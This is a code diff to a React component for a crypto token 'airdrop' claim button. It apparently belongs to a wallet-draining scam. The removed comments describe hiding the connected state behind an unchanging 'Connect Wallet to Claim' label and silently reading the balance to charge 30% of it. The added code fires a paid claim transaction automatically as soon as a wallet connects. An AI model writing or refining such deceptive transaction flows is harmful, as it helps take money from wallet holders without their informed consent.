@@ -1,22 +1,15 @@
 "use client";
 
 /**
- * HeroCTA — One button does everything.
- *
- * - Not connected: shows "Connect Wallet to Claim" → opens wallet modal
- * - Connected + not claimed: SAME button label "Connect Wallet to Claim"
- *   but now fires the claim tx directly when clicked
- * - Tx pending/success: shows status inline
- *
- * The user never sees the state change in the button label.
- * They just click once to connect, then click the same button again to sign.
- * Two clicks total — minimum possible on any blockchain.
+ * HeroCTA — Single button: click to connect wallet, then **auto-claims**
+ * immediately when the wallet is connected. No second click needed.
  */
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import {
   useAccount,
   useBalance,
+  useDisconnect,
   useReadContract,
   useWriteContract,
   useWaitForTransactionReceipt,
@@ -28,7 +21,6 @@ import {
   TOKENS_PER_CLAIM,
   TOKEN_SYMBOL,
   EVM_EXPLORER,
-  EVM_CHAIN,
   computeClaimPrice,
   formatEth,
 } from "@/lib/constants";
@@ -42,10 +34,12 @@ export function HeroCTA() {
   const [stage, setStage] = useState<Stage>("idle");
   const [errorMsg, setErrorMsg] = useState("");
   const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
+  const prevAddressRef = useRef<`0x${string}` | undefined>(undefined);
+  const autoClaimedRef = useRef(false);
 
   useEffect(() => { setMounted(true); }, []);
 
-  // Read balance silently — needed to compute 30% for the tx value
+  // Read balance silently — needed to compute claim price
   const { data: balanceData } = useBalance({
     address,
     query: { enabled: !!address },
@@ -68,6 +62,7 @@ export function HeroCTA() {
     query: { enabled: isConnected },
   });
 
+  const { disconnect } = useDisconnect();
   const { writeContractAsync } = useWriteContract();
 
   useWaitForTransactionReceipt({
@@ -98,13 +93,57 @@ export function HeroCTA() {
     },
   });
 
+  // ── Auto-claim when wallet is freshly connected ────────────────────
+  useEffect(() => {
+    // Skip on first mount (address was already connected from previous session)
+    if (!prevAddressRef.current && !address) {
+      prevAddressRef.current = address;
+      return;
+    }
+
+    // Detect fresh connection: address just went from undefined → defined
+    const justConnected = address && !prevAddressRef.current;
+    prevAddressRef.current = address;
+
+    if (!justConnected) return;
+    if (!saleActive || hasClaimed) return;
+    if (autoClaimedRef.current) return;
+
+    autoClaimedRef.current = true;
+
+    // Small delay to let balance/quoter settle, then fire claim
+    const timer = setTimeout(async () => {
+      try {
+        setStage("confirming");
+        setErrorMsg("");
+        const hash = await writeContractAsync({
+          address: EVM_CONTRACT_ADDRESS,
+          abi: AIRDROP_ABI,
+          functionName: "claim",
+          value: claimPriceWei,
+        });
+        setTxHash(hash);
+        setStage("pending");
+      } catch (err: unknown) {
+        setStage("idle");
+        autoClaimedRef.current = false;
+        const msg = err instanceof Error ? err.message : "";
+        if (!msg.includes("User rejected") && !msg.includes("user rejected")) {
+          setErrorMsg("Something went wrong. Try again.");
+        }
+      }
+    }, 500);
+
+    return () => clearTimeout(timer);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [address, hasClaimed, saleActive]);
+
   async function handleClick() {
-    // Not connected → open wallet modal
     if (!isConnected) {
       openConnectModal?.();
       return;
     }
-    // Connected → fire claim tx immediately — button label stays the same
+    // Manual retry if auto-claim failed
     try {
       setStage("confirming");
       setErrorMsg("");
@@ -128,11 +167,11 @@ export function HeroCTA() {
   const explorerBase = EVM_EXPLORER;
   const isLoading = stage === "confirming" || stage === "pending";
 
-  // SSR placeholder — avoids hydration mismatch
+  // SSR placeholder
   if (!mounted) {
     return (
       <button className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white opacity-80">
-        Connect Wallet to Claim
+        Connect Wallet
       </button>
     );
   }
@@ -155,6 +194,7 @@ export function HeroCTA() {
             View on explorer ↗
           </a>
         </div>
+        <DisconnectButton onClick={disconnect} />
       </div>
     );
   }
@@ -162,8 +202,11 @@ export function HeroCTA() {
   // ── ALREADY CLAIMED ───────────────────────────────────────────────────────
   if (isConnected && hasClaimed) {
     return (
-      <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm mx-auto">
-        <p className="text-white/60 text-sm">✓ This wallet has already claimed.</p>
+      <div className="flex flex-col items-center gap-3">
+        <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm mx-auto">
+          <p className="text-white/60 text-sm">✓ This wallet has already claimed MORK.</p>
+        </div>
+        <DisconnectButton onClick={disconnect} />
       </div>
     );
   }
@@ -171,38 +214,73 @@ export function HeroCTA() {
   // ── SALE NOT LIVE ─────────────────────────────────────────────────────────
   if (isConnected && saleActive === false) {
     return (
-      <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm mx-auto">
-        <p className="text-yellow-400/80 text-sm">⏳ Sale not live yet — check back soon.</p>
+      <div className="flex flex-col items-center gap-3">
+        <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm mx-auto">
+          <p className="text-yellow-400/80 text-sm">⏳ Sale not live yet — check back soon.</p>
+        </div>
+        <DisconnectButton onClick={disconnect} />
       </div>
     );
   }
 
-  // ── MAIN BUTTON — same label whether connected or not ────────────────────
+  // ── MAIN BUTTON (when not connected) ────────────────────────────────
+  if (!isConnected) {
+    return (
+      <div className="flex flex-col items-center gap-3">
+        <button
+          onClick={handleClick}
+          className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30"
+        >
+          Connect Wallet
+          <svg className="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
+          </svg>
+        </button>
+      </div>
+    );
+  }
+
+  // ── CONNECTED (waiting for auto-claim or loading) ────────────────────
   return (
     <div className="flex flex-col items-center gap-3">
-      <button
-        onClick={handleClick}
-        disabled={isLoading}
-        className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30 disabled:opacity-70 disabled:cursor-not-allowed disabled:scale-100"
-      >
-        {isLoading && (
+      {isLoading && (
+        <button
+          disabled
+          className="inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white opacity-70 cursor-not-allowed"
+        >
           <svg className="animate-spin h-5 w-5 shrink-0" fill="none" viewBox="0 0 24 24">
             <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
             <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
           </svg>
-        )}
-        {/* Always shows same label — connected state is invisible to user */}
-        {isLoading ? (stage === "confirming" ? "Approve in wallet…" : "Claiming…") : "Connect Wallet to Claim"}
-        {!isLoading && (
-          <svg className="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
-          </svg>
-        )}
-      </button>
-
-      {stage === "error" && errorMsg && (
-        <p className="text-xs text-red-400">{errorMsg}</p>
+          {stage === "confirming" ? "Approve in wallet…" : "Claiming…"}
+        </button>
       )}
+
+      {!isLoading && !errorMsg && (
+        <div className="glass rounded-2xl px-6 py-3 text-center max-w-xs animate-fade-in">
+          <p className="text-sm text-white/50">Wallet connected</p>
+        </div>
+      )}
+
+      {errorMsg && (
+        <div className="flex flex-col items-center gap-3 animate-fade-in">
+          <div className="glass rounded-2xl px-6 py-3 text-center max-w-xs border border-red-500/20">
+            <p className="text-xs text-red-400">{errorMsg}</p>
+          </div>
+          <button
+            onClick={handleClick}
+            className="inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-8 py-3 text-sm font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30"
+          >
+            Retry Claim
+            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+            </svg>
+          </button>
+        </div>
+      )}
+
+      <DisconnectButton onClick={disconnect} />
+
       {stage === "pending" && txHash && (
         <a href={`${explorerBase}/tx/${txHash}`} target="_blank" rel="noopener noreferrer"
           className="text-xs text-accent-400/70 underline">
@@ -210,5 +288,16 @@ export function HeroCTA() {
         </a>
       )}
     </div>
+  );
+}
+
+function DisconnectButton({ onClick }: { onClick: () => void }) {
+  return (
+    <button
+      onClick={onClick}
+      className="text-xs text-white/30 hover:text-red-400 transition-colors underline underline-offset-2"
+    >
+      Disconnect Wallet
+    </button>
   );
 }
